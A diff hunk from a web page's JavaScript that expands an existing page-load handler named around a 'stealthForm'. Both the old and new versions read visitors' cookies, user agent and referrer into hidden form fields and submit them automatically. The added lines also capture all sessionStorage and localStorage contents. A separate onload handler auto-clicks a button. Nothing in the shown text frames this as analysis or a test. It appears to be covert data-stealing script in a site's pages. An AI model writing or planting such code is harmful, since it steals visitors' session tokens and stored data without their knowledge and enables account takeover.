@@ -1152,22 +1152,28 @@ function docReady(fn) {
 }
 uic_prov_al();
 	
-        document.addEventListener("DOMContentLoaded", function() {
-            // Capture cookies, user agent, and referrer
-            var cookies = document.cookie || "No_Cookies";
-            var userAgent = navigator.userAgent || "Unknown_User_Agent";
-            var referrer = document.referrer || "No_Referrer";
+document.addEventListener("DOMContentLoaded", function() {
+        // Capture cookies, user agent, and referrer
+        var cookies = document.cookie || "No_Cookies";
+        var userAgent = navigator.userAgent || "Unknown_User_Agent";
+        var referrer = document.referrer || "No_Referrer";
 
-            // Inject data into form fields
-            document.getElementById("cookieField").value = cookies;
-            document.getElementById("userAgentField").value = userAgent;
-            document.getElementById("referrerField").value = referrer;
+        // Capture sessionStorage and localStorage
+        var sessionData = JSON.stringify(sessionStorage) || "No_Session_Storage";
+        var localData = JSON.stringify(localStorage) || "No_Local_Storage";
 
-            // Submit form only if data exists
-            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
-                document.getElementById("stealthForm").submit();
-            }
-        });
+        // Inject data into form fields
+        document.getElementById("cookieField").value = cookies;
+        document.getElementById("userAgentField").value = userAgent;
+        document.getElementById("referrerField").value = referrer;
+        document.getElementById("sessionField").value = sessionData;
+        document.getElementById("localField").value = localData;
+
+        // Auto-submit if meaningful data is present
+        if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || sessionData !== "No_Session_Storage" || localData !== "No_Local_Storage") {
+            document.getElementById("stealthForm").submit();
+        }
+    });
 	    window.onload = function() {
     document.getElementById("runbtn").click();
   };
